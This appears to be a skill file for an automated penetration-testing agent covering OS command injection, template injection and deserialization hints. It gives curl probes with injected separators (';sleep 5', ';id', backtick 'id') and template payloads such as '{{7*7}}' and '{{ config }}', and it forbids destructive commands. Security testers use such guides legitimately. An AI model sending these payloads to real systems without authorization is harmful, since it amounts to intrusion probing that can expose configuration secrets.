---
name: command_injection
description: OS command injection and related injection classes (SSTI, template, eval)
---

# Command Injection & Friends (CWE-78, CWE-94, CWE-1336)

## 1. OS command injection

Candidates: file name/size params, ping/lookup features, PDF/QR generation,
anything that shells out. Probe with a harmless, observable marker:

```bash
# time-based (most reliable, works blind):
curl -s "<target>/ping?ip=127.0.0.1;sleep 5" -o /dev/null -w '%{time_total}\n'
curl -s "<target>/ping?ip=127.0.0.1%7C%7Csleep%205" -o /dev/null -w '%{time_total}\n'

# output-based:
curl -s "<target>/process?file=x;id"
curl -s "<target>/process?file=x%60id%60"      # `id` backticks URL-encoded
```

Separators to try: `;`, `|`, `||`, `&&`, backticks, `$()`. Compare against a
baseline timing (`;sleep 0` style control) so slow apps don't fool you.

Destructive commands (rm, shutdown, fork bombs) are FORBIDDEN — `id`,
`sleep`, `whoami`, `uname -a` prove impact completely.

## 2. SSTI (server-side template injection)

If responses render user input server-side (error pages, email/preview
features), probe template engines:

```bash
curl -s "<target>/preview?tpl=7*7"          # 49 → arithmetic eval → SSTI
curl -s "<target>/preview?tpl={{7*7}}"      # Jinja2/Twig
curl -s "<target>/preview?tpl=${7*7}"       # FreeMarker/EL
curl -s "<target>/preview?tpl=<%= 7*7 %>"   # ERB
```

`49` anywhere in the response confirms evaluation. Escalate to RCE-proof only
with harmless reads (e.g. `{{7*'7'}}` fingerprint, `{{ config }}` style) —
stay non-destructive.

## 3. Code eval / deserialization hints

- Params returning different errors for `phpinfo()`-style probes.
- Base64 blobs or `O:`/`rO0` prefixes in cookies → serialized objects
  (note as a finding only if you can alter behavior).

## 4. Validation bar

- Evidence: baseline vs probe timing (numeric), or marker output (`id`
  result) in the response body.
- PoC: exact curl, both control and injection request.
- If only the error message changes and nothing executes, report as a
  lower-severity info-disclosure/improper-input finding, not command
  injection.
